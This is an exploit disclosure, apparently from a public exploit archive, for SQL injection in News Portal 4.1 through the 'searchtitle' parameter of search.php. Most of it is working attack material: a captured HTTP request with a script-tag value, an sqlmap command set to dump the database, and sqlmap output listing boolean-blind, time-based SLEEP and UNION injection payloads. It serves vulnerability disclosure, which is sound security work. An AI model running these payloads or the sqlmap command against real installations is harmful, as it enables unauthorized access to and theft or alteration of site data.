# News Portal - SQL Injection - 4
+ **Exploit Title:** News Portal - SQL Injection - 4
+ **Date:** 2024-01-04
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://phpgurukul.com/news-portal-project-in-php-and-mysql/
+ **Software Link:** https://phpgurukul.com/?sdm_process_download=1&download_id=7643
+ **Version:** 4.1
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number

## Description:
News Portal System  4.1 allows SQL Injection via the 'searchtitle' parameter in "http://localhost/newsportal/search.php". Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/newsportal/search.php"
+ Write something
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
POST /newsportal/search.php HTTP/1.1
Host: localhost
Content-Length: 51
Cache-Control: max-age=0
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/newsportal/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: language=en; continueCode=5vLeVxlRzkNb47vKDPMo5Lq8wdzLtvf1Hem0jn6EZm2ygrX19BpaQWOJY3oM; welcomebanner_status=dismiss; cookieconsent_status=dismiss; PHPSESSID=dfcdlcor0hrif7af2b2tjeejt6
Connection: close

searchtitle=%3Cscript%3Ealert%282%29%3C%2Fscript%3E
```

+ Use sqlmap to exploit. In sqlmap, use 'searchtitle' parameter to dump the database.
```
sqlmap -r r.txt -p searchtitle --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: searchtitle (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: searchtitle=<script>alert(2)</script>' OR NOT 1334=1334-- IgdK

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchtitle=<script>alert(2)</script>' AND (SELECT 5245 FROM (SELECT(SLEEP(5)))PmjM)-- oAXp

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: searchtitle=<script>alert(2)</script>' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71767a7171,0x584943594746724871704b485a6b79775478485578665a66724a63614771616f59486a5441536e59,0x7171767071)-- -
---
[21:02:13] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[21:02:13] [INFO] fetching current database
current database: 'newsportal'
```
+ current database: `newsportal`

![Ekran görüntüsü 2024-04-01 040250](https://github.com/BurakSevben/CVEs/assets/117217689/33d760f2-e896-49df-ae8d-411aad55e335)
